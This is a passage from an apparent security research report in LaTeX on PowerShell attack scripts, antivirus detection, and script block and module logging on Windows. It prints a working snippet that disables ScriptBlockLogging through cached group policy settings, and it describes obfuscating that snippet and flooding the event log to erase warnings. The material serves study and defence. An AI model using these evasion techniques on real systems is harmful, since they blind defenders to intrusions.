+Privilege escalation attacks, are attacks that make use of software vulnerabilities to gain administrator privileges. This would allow the user to gain access to restricted parts of a computer (including the file in which the administrators key is stored) and run more malicious scripts. If an attacker gains access to the password of an administrator, then he can access the machine at any given time without raising an alarm. It is not hard to see why every attacker would want this type of access. But gaining admin privileges is in general much harder then gaining access to a system or exploiting some vulnerabilities. Manual privilege escalation usually requires a deep understanding of the system and software that is used. For that reason it is difficult for most attacker to execute privilege escalation attack on their own. To circumvent this problem, most attackers make use of pre-written scripts, including PowerShell scripts, to gain administrator access. That also means that if a perfect defence system against scripting was feasible, then it would become almost impossible for most attackers to gain administrator privileges. But as is right now, a `script kiddie`, a term used to refer to a person who can only attack a computer using existing scripts while lacking any understanding of the script or the ability to write their own, can gain administrator privileges. In this section a popular PowerShell script called 'Privesc' will be used. This script scans the computer for known vulnerabilities, and suggests to the user some attacks that he then can execute. Because the script may require user input multiple times, these type of scripts are run by attackers after the attacker establishes a reverse shell. Which as shown in the previous section can be established without triggering the AV program. In this test no obfuscation is used, since Privesc comes with its own obfuscation. Any further obfuscation results in a crash since the file itself exists out of four thousand lines with each line containing at least ten characters. The results can be found in table $11$.
+
+\subsubsection{Conclusion}
+During the execution of all scripts, the PowerShell logging tool generated a large number of log entries. While the execution time was fairly short, the number of log entries created easily exceeded hundreds of megabytes. The AV was able to detect the keylogger script, and the ransomware script, while failing to detect the reverse shell script and the privilege escalation script. During the execution of Privesc.ps1, the DLLInjection command was used to inject a command inside a dll service. This was also not detected by the AV. Since the AV was not able to detect the scripts, it can also be assumed that the AMSI tool did not detect it either, which shows that there are scripts that attackers can use during their attacking process, that will go through the default defence system of the average user. But when looking at the event logger, we can see in table \hyperlink{table9}{9} and table{table10}{10} that, the event logger was able to detect some suspicious activity which were documented in the log file with the warning level. Further more the event viewer shows that some scriptblocks are to large to fit in one event viewer. This can be seen in image \hyperlink{fig1}{1}, where the log event states:
+\begin{verbatim}
+Creating Scriptblock text (2 of 52)
+\end{verbatim}
+This means that a very large script, large as in the script contains a high number of symbols, is executed. As mentioned before the obfuscation techniques of Invoke-Obfuscation create large scripts when obfuscated. Most scripts when obfuscated end up being larger then five hundred thousand symbols. So this event log, could perhaps indicate that an obfuscated file was executed. 
+The windows versions,Windows $7$ and $8$ Home edition, which do not have scriptblock logging and module logging, did not show any sign of suspicious behavior. Which means that a new line of defence built around logging would be useless. It might be worth noting that scriptblock and module logging can be added to windows $7$ and $8$ if the OS is upgraded to pro edition. It is fair to assume that most people will not buy the upgrade, therefore leaving them vulnerable to some attacks. But if scriptblock and module logging are enabled and configured correctly, then they can act as another layer of defence. Some possible configurations will be presented in the next section.
+
+\subsection{What techniques can be used to bypass the logging of obfuscated commands.}
+PowerShell script logging is used by forensics teams to find what the attackers intentions were. [\hyperlink{o5}{o5}] But thanks to continuous development of the script logging tool, it is now also possible to detect an attack using by using the module logging and scriptblock logging tool (available in PowerShell v5 or later).
+\subsubsection{PowerShell Module Logging}
+[\hyperlink{o6}{o6}] Module Logging has been available since PowerShell v3. This logging tool logs command invocations, which can be very useful since some command invocations, such as "IEX Some-string", immediately raise suspicion. This tool logs these commands sometimes even if the command has been obfuscated. There are multiple log analysis tools that make use of the logs created by module logging to alert a server manager. Therefore bypassing the module logging is important.
+\subsubsection{PowerShell Script Block Logging}
+[\hyperlink{o6}{o6}]Script Block Logging logs the whole block of code just before it gets executed. This ensures that the whole attacking script is logged. It also deobfuscates the code if necessary. It also makes certain obfuscation techniques obsolete such as [\hyperlink{o6}{o6}] encoding in \textit{XOR},\textit{Base64} and \textit{ROT13}. Script block logging is only available on windows 10 and windows server 2016+. [\hyperlink{o6}{o6}] The script block logging tool also compares the code blocks with hashes of known malicious scripts as a quick check. If they match it can be found with the warning tag in the Event viewer.
+\subsubsection{Importance}
+SIEM tools (and [\hyperlink{o7}{o7}] AMSI) have become another line of defence. Therefore an attacker also needs to bypass the PowerShell logging tool during an attack. This makes the sub-question: \textbf{"What techniques can be used to bypass the logging of obfuscated commands"}. This question has been partly answered by [\hyperlink{o8}{o8}] Andy Green, who tested the module logging capabilities.Some obfuscated code can be deobfuscated by the logging tool (both module and code block logging). However when multiple iterations of obfuscation is used, the logging tool instead logs the obfuscated command with the obfuscation.
+\newline\newline
+\hypertarget{fig1}{
+	\textit{Figure 1: ScriptBlock logging log for large obfuscated Get-Keystokes.ps1 from PowerSploit}\\
+	\includegraphics[scale=0.44]{1.png}
+}
+
+However the fact that the obfuscated code can be logged completely can be a problem if read by the SIEM program. For example in figure $1$ it can be seen that the event viewer has labeled the scriptblock with the warning level. Therefore it might be important to find a way to make the logging tool completely irrelevant.
+
+It might be useful to note that when a command is to large to be written in one log event, it is split in multiple log events. This can also be seen in figure $1$ in the very first line saying:\textbf{"Creating Scriptblock text (2 of 52)"}. Further more the event viewer has a maximum storage value for each log, which is $15360$ kb. With this information a new question can be asked: \textbf{What happens if the scriptblock creates a larger log file then the maximum storage value?} The log file created by running the obfuscated Get-Keystrokes.ps1 file is $2.06$ mb. Therefore to answer the question above, the maximum storage capacity is shrunk to 1028kb. Executing the script again resulted in:\newline\newline
+
+\textit{Figure 2: ScriptBlock logging log for large obfuscated script with 1028kb storage space}\\
+\includegraphics[scale=0.44]{2}
+The log file has been written over multiple times which removed all the warning that it showed initially. However the event viewer also allows the server admin to store the log files when maximum capacity has been reached instead of deleting the oldest entry. In general it can be assumed that this option won't be used as it gives an attacker an easy way to fill the computers storage space with trivial commands. In fact after searching for log files with event ID $4104$ which is the event id used for scriptblock logging, it became apparent that none of the events were stored. This probably happened because the event viewer was trying to store all segmented parts of the scriptblock in one file.
+
+\subsubsection{Conclusion}
+The PowerShell logging tool is indeed capable to deobfuscate obfuscated scripts. The module logging, as stated in \hyperlink{o8}{o8}, can find invocation commands when called through the obfuscated script, which would mean that a SIEM tools could use the log file to detect a security breach. However bypassing it is fairly simple. A hacker could test the obfuscated script on his own VM first before running it on the victim's system in order to find the right obfuscation for the script. The PowerShell scriptblock logging tool on the other hand, is much more powerful. It can not only deobfuscate scriptblocks, it also can scan the unobfuscated scripts and compare them to known malicious scripts. When the logging tool finds a match it labels the scriptblock as potentially malicious which can be seen in \hyperlink{fig1}{figure 1}.
+There are multiple ways to bypass the logging tools. The most commonly used bypass would be [\hyperlink{o7}{o7}]:
+\begin{verbatim}
+$settings = [Ref].Assembly.GetType
+  (“System.Management.Automation.Utils")
+.GetField(“cachedGroupPolicySettings","NonPublic,Static").GetValue($null);
+$settings
+[“HKEY_LOCAL_MACHINE\Software\Policies
+\Microsoft\Windows\PowerShell\ScriptBlockLogging"]
+ = @{}
+$settings
+[“HKEY_LOCAL_MACHINE\Software\Policies
+\Microsoft\Windows\PowerShell\ScriptBlockLogging"]
+.Add(“EnableScriptBlockLogging", “0")
+\end{verbatim}
+And a similar command would deactivate PowerShell module logging. This command uses the group policy that has been cached and therefore does not require any additional privilege. Meaning it can be executed by any user. However it is important to note that the command itself has been logged. Which can trigger an alarm on its own. Therefore obfuscating this command would be necessary to bypass the PowerShell logging and the SIEM tools. To check the effectiveness of obfuscation, the command:
+\begin{verbatim}
+[Ref].Assembly.GetType("System.Management.Automation.Utils")
+.GetField("cachedGroupPolicySettings","NonPublic,Static")
+.GetValue($null)
+["HKEY_LOCAL_MACHINE\Software\Policies
+\Microsoft\Windows\PowerShell\ScriptBlockLogging"]
+= @{}
+\end{verbatim}
+was obfuscated 60 times, each having a distinct iteration of different obfuscation techniques. The result was that PowerShell module logging was able to deobfuscate to command currently each time. This is probably the case since the command is a well known command and so many hashes of this command have probably been stored to which the obfuscated files were compared to. The log file would reach a size of $6$ mb on average, which is fifty percent of the standard size of the log file. In these types of situations, increasing the size of the events logged by executing the script would be very useful as a bypass technique.
+
+
 \newpage
 \subsection{What additional defence systems can be deployed against obfuscated PowerShell scripts}
 The default defense system on a windows machine, as seen in the previous section, does not seem to be enough. Therefore it is important to look for alternative ways to defend against PowerShell attacking scripts. This section will discus several additional defence techniques, and will analyse their potential.
